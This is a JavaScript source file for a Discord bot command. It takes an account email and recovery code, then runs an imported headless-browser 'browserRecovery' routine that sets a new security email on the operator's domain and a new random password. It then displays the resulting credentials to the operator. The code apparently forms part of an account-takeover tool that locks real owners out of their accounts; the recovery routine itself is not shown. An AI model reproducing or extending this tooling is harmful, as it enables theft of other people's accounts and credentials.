const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { domains } = require("../../../config.json");
const generate = require("../../utils/generate");
const { browserRecovery } = require("../../utils/secure/newrecovery");

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const recoveryRegex = /^[A-Za-z0-9]{5}(?:-[A-Za-z0-9]{5}){4}$/;

module.exports = {
    name: "browserrecsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        const email = interaction.components[0].components[0].value;
        const recoveryCode = interaction.components[1].components[0].value;

        if (!email || !emailRegex.test(email)) {
            return interaction.reply({
                content: "Please enter a valid email address!",
                ephemeral: true
            });
        }

        if (!recoveryCode || !recoveryRegex.test(recoveryCode)) {
            return interaction.reply({
                content: "Please enter a valid 25-character recovery code (format: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX)!",
                ephemeral: true
            });
        }

        await interaction.deferReply({ ephemeral: true });

        const secEmail = `${generate(16)}@${domains[0]}`;
        const password = generate(16);

        try {
            const result = await browserRecovery(email, recoveryCode, secEmail, password, { headless: true });

            if (result?.status !== "success" || !result?.payload) {
                const errorMsg = result?.error || result?.stage || "Unknown error";
                return interaction.editReply({
                    content: `Browser secure failed: ${errorMsg}`,
                    ephemeral: true
                });
            }

            const data = result.payload;

            const response = {
                embeds: [
                    {
                        title: "Browser Secure Successful",
                        fields: [
                            { name: "Email", value: "```\n" + data.email2 + "\n```", inline: false },
                            { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: false },
                            { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                            { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                        ],
                        color: 0x00c853
                    }
                ],
                components: [
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId(`copyrec|browser|${data.email2}`)
                            .setLabel("Copy (Not wired)")
                            .setStyle(ButtonStyle.Secondary)
                            .setDisabled(true)
                    )
                ],
                ephemeral: true
            };

            return interaction.editReply(response);
        } catch (error) {
            console.error("[browserrecsecure] Unexpected error:", error);
            return interaction.editReply({
                content: `Unexpected error while running browser secure: ${error.message}`,
                ephemeral: true
            });
        }
    }
};

